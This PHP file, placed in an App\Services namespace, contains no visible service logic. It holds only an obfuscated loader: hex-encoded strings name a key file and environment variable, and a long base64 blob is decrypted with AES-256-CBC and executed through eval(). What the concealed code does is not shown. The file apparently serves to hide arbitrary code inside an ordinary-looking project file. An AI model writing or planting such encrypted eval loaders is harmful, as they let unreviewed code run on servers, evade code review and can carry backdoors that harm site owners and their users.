<?php
namespace App\Services;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('X6aYSHytGbXkzccr3aLHOw==');

$c=base64_decode(

'e0UpOBBlkrX+ASV4vhIrrhTAMVFnzT81PA7lF5zDStBFcn7pu7FmMjggaE5BXHSEWlJJsrYFwE21' .
'PmCTh9GpVf2QWHqFxZqnUMt3Qy63TwQVR2qvlcsHDS21910YG1cLdya8qL11Ipd6zK3iJOXa0NrO' .
'pCbyB4J/F58TCh9mlEfi7MrQjxdTlFzOzsvOJp4kg0sZbiClk9zLhmVm8eiFnVB+whVK8sb43rZe' .
'hAqO8UCYyuE9Vg3t4a+xbmhLF9b/Ok1RriB2zvnr8l0I0M39xfOi3N6jWZmDjoNr+D9r/7LMFKQn' .
'V6XZFymDmhby3ItfistrtUkMqn3AXYfYdTI/3VJLT2peUPoMGQX26UejhzD7esZ8NbBAiOBD00LH' .
'gQLuDxujGMqFA6H4BoyJnnb0xvtUTcYqt/sqHuoEs/PM+mJ7ZVtTslFlHfe8QLemCwrgTWcbzAY7' .
'bsvbkShkll7Wna8cGGo6Yg1wr0oUC5o/rbODU8mQruGbC8DwhQQwYSV86wNYJww777wPLRljeS+v' .
'7/HIWvERpfZMb0QST9z8k8bY8yzuD/zBuZdABbJj7NKgK7Fzduy7XMaCN6uv17wTMG+z59kI8iCT' .
'9sT2RHOIwNkcVnmYShpWrycGlkRmGjGJLCRZstmgcdhxs0k6rWo6exwie0WEnn49TeCXLuVevGwm' .
'Tw9ONLmaUc87yC5Kc6DM+etSg32bBVvPZzhMU6Fafm4ePqBD66W8Si0LhwZ0jFN7InwabdNJorKM' .
'GZJvckrGMgsS5DDOYPNJ136rBQRcDaPKQCVQ8+dkFOy9wRGKouAwCWes1JH/nt+WRDQpOmr2sn9F' .
'IlauMoG3NQWbbpUg++QGmD+n0pWiuSwl415OAgjNdaMWx5fZYNUs58vNCo7wcJNpIzFPkZggfXi5' .
'ILXaMASbwd+uxRJN7V303dbY2yBWBllHXvmVzT9DRPFhgrob4encn5NYedsarZ8bbE+3cvVqdzjr' .
'8leP2mLk9/GhIk3VUQCynsPiNDuIIVWUijtGdil8XxbmMqWn/4SyxJS5XX8owWhOkdloq+nF0AwM' .
'Y70xb6wCAd8NDqIUb53iakQ8iK6uNW64xqqLj77965ag6mUKCofrrJgiw+JNsYow45xyGRVICLah' .
'VT6kVnSWS3/GFPNwnYl5uQFNYIFep4oRT/vaxGoWtgVPjt4K/jDeuE1BheVgmfFzzr89CmiiLUZj' .
'+LRuEl4Uq2hjkNn/u1B8rhtbbfz6aGsorlWepN3INRAPYVnoGXjl28T8VQut9OYMNgRs/0ViUM5B' .
'iOgw8baqYnlwJHOWE4y/IfPJLEn48I24S2iKUMX0jUnSzfhdWWY+COkhxyyiq+TuzzhOVLxouVMm' .
'AL8jr6RZfTUbGMB9606S2GsOqbt+gmoLKNyngEsfWkeHtjnYzZJ2Klmzz8kkgKJlw7wJjr/dNxeA' .
'WcmzL2/aACUiagpKpu9w8+Cp8zspsd4SsdCPblEWsPprocmB0b2esp7VvUeanDy+A9Anaobc6J0j' .
'ZF+y7Mt9Cy2Rk5Ye3ytZJ6MRt55LC/8acdVcolFMufftlxi62ipevJ9o5lMW9xOD5jsK6KiYJ1rT' .
'pv+BMU0c1RcuL4gFlNwO5xkhcIZ3ucdIVYJlzilkdyYWRSKPzLfu8cle7kJbmvSfsb6Wq2K7yV3c' .
'ZzNOml7lg9O8YZXgAjJRJeDx4XCgvz5uU+qLMs9ae2zoeYMNxVrnf47gAsg4cQ46nbSeiATQnd+Z' .
'p/jirWOtLOCZbDqDcqhIRCqh4PfZsK1FykfJSBK9AiIrdBASPzr1kW3oMvlbPFaEdSDOby1geXVE' .
'iTsf6xwcCfx75vErV29sw8iA9phPjH06PycYFr6ENxapDgkOLFJel4IPdzVtZYwiuoTt3T9h2Zh9' .
'rWbn/HlZJbGLemIfEHEzoRX4094mcIOHTWRBKsdBlccgBPF8xwhjlhkN1Fbe3i+SMeBU/8FlCPEy' .
'tpMT+H3l/URMYUf4jfi+JL8TDs6y7t8oX/dYlPil14JgKKz8O4Y/UGtC1qCeud1x5zHNZJjBhYmJ' .
'tM6g1C2CyADQ0uUeQu+xT8Sg6Y7nKJ+kJJRVcM+khVBntTZWqFUK0vojGi7Av6pKi52+Y9/bORWR' .
'oF45VmRcFWnnuYHzbJlYcVTd1XxWeI2kIdNKXzBLQ6F5ZZA5tyDfSII48X23Q4JnRQNdQqY8hAs5' .
'nEvktVxlmQjCC5mFJJPMVxE37vvi+VZOhoPzXSClQBmT9g97g/Ukk91Xcx61O0/W/ZIEHFR/trCv' .
'EdnUNzmrh2STLrVei4D+JwTt0Nq9tDokpQLAvxgpwAezK5ssevplYyWvsfNgv1sqQW75Qazo3H0/' .
'EINyNMrlNyDmBtc/kolyggxGg+GuSimsweiN26kBja1DxOq1yntIpw8H6MjZbpYPPOu4UtrMPRwT' .
'sogKp/1CAYrOpTXvLFqnLTHOk+r9SQuTBYXI39o/ho0SlPWOrwGv2pFkTFMnZ9gBoBT7dR5X4SdV' .
'bArtJ8Vs3eg4JIHFEQtjpFDputsHElmJPu0DgkxlXwiABmpbM5CRL3PEeNEf3pDslhAWBinhhl1D' .
'HaZo0ps6gIkEsExL2ujTX4dMfrXD/14ET2MpkH4I6wW2dhLAvS/GhuF5PudHoqEl4ONQCu7Js1J3' .
'16F6H+5xdoMzkHpdvtc2tCdiX9cp2AK6+Qpe3qTT4y0tCgS+q74KzdKFwHGpjVGqTH9v4gPR+Qta' .
'oyDGG5mnQlfZZfmPOCUxBPAM+hXfPzFQQ32fcTKmSHa3N/mNOGyd3zPUge2qwCXt57kr24ODd5iJ' .
'mpLGdu9HJENW7Z4Tiap9yGjs7WVK2yyaY9Y19xBxXWjLCGoxfzdPt4kn4QLeVrHWHJ4A101MDqS3' .
'OS6yz776pnala4+zyY5aTXP4JKOgBqB8JISYbTlZ19pKUXhyngvDYFG/Kgxh35+SmuhVFW1eN1cV' .
'6sEajlthEodADC62LlJMtneBh5aZ2jU/PgElsb/PuL1nwX4x28casdmRDK4nNJpGZR3cy6Xz9Hz9' .
'CleJ+kKbF/PvbDRLUoWSNgB6/sIAvjX8xP3/bWcQ3Y61dumOhJooY1JJFPTfFnersnOFy08vPrMD' .
'g2SYIZ1ueVQmZlGk4lPzrYmTakDtSogTQEDwL/6UtgmaddlsECQ+nj3HRSiYlgrBeDGmsHW2SSap' .
'T6R6A8oNlPUys1szfIJi/821pDmL4Mg6WkXV/fXkww027lyy2rX9hNBY7J/lgOG/9MbMr3PqlMB0' .
'Y8mvxb39QkSbvLO78NTfgcsFGf7gSBp+29ShU7PEe0DXNnuaWMMdeVLp3YOt3hOi8/NndSZfOWve' .
'2H9g861wBTYfy60zlaqK/fnqpRYQNl5tllgWV8I3SquJp0a2s7AxYtT5EPm2JQFN4o9rHUVvGjRX' .
'1HMtCPw+lUqB0u0='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

